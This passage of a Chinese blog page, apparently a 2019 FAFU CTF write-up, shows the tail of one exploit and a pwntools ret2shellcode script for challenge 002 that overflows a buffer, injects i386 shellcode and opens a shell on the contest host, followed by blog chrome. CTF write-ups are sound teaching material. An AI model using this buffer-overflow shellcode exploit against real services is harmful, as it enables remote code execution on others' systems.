</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="002"><a href="#002" class="headerlink" title="002"></a>002</h4><p>考察基础的ret2shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&apos;172.20.3.35&apos;,9999)</span><br><span class="line">#sh = process(&apos;./Bin&apos;)</span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">#buf2_addr = 0x0804853b</span><br><span class="line">hin_addr=0x080484ed</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&quot;a&quot;*108+shellcode[0:4] + p32(hin_addr)+shellcode[4:])</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-05-20T01:29:45.705Z" itemprop="dateUpdated">2019-05-20 09:29:45</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/10503/" target="_blank" rel="external">https://Foxgrin.github.io/posts/10503/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/10503/&title=《2019-FAFU-ctf WP》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/10503/&title=《2019-FAFU-ctf WP》 — Somnus's blog&source=第一次办校赛，不得不说问题出现还是挺多的，没考虑到太多人出现平台卡和网络卡的问题，不过办比赛还是学到挺多的" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/10503/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019-FAFU-ctf WP》 — Somnus's blog&url=https://Foxgrin.github.io/posts/10503/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/10503/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/6413/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：利用Apache解析漏洞(CVE-2017-15715)绕过文件上传限制getshell
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/43152/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：第十二届全国大学生信息安全竞赛-Web">下一篇：第十二届全国大学生信息安全竞赛-Web</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/10503/&title=《2019-FAFU-ctf WP》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/10503/&title=《2019-FAFU-ctf WP》 — Somnus's blog&source=第一次办校赛，不得不说问题出现还是挺多的，没考虑到太多人出现平台卡和网络卡的问题，不过办比赛还是学到挺多的" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/10503/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019-FAFU-ctf WP》 — Somnus's blog&url=https://Foxgrin.github.io/posts/10503/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/10503/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAB0UlEQVR42u3ay46DMAwF0P7/TzPbkVrSaxsyjHSyQpSmpywsP/J6xet4W8mTv++sry9euLi4Y+6xXGdbr59M7ieffvhLuLi4G7lnESO5Pts6v58YcHFxn89dpzvrUJWnO7i4uM/nrgNTr0zCxcV9MjcvTpJNq22RW2o1XFzcATfvUt53fUt/FxcXt8U9imsSvKpN0g/fwsXF3cLtjVLyAUnSPC2nULi4uFu4SRZRfaaXMOV3cHFx93Dz41a9dkkeIkeHMHBxccfc/GBEtVXaK6i+vCBcXNwt3EKZUUyAekcuyskTLi7uDdxe4yP/gfz4RdQiwcXF3citpiCTQigfzHzYExcX90+51dFpb5iav4JRhoWLi1vkXnUwqzdkTXC9UQ0uLu6cW/3CnrRmNKHFxcUdc5M4N2+P5v2NQsTFxcW9jTtJSqoHrXrt19MUBxcXdwu3mpTkYShPXMoZGS4u7qXc3iGqajFzVVDDxcXdw602TPNRShKeqmUSLi7uTu68p9ILRvlQ9uIWEC4ubsztpSPriDhJU3Bxcf8Xt0qptke/2HBxcR/JzRujFxyweH8eFxd3I3de/FSnHr3hDS4u7h5uNZT0tp6UTM3+Li4ubof7A43WkJ9p/IRgAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
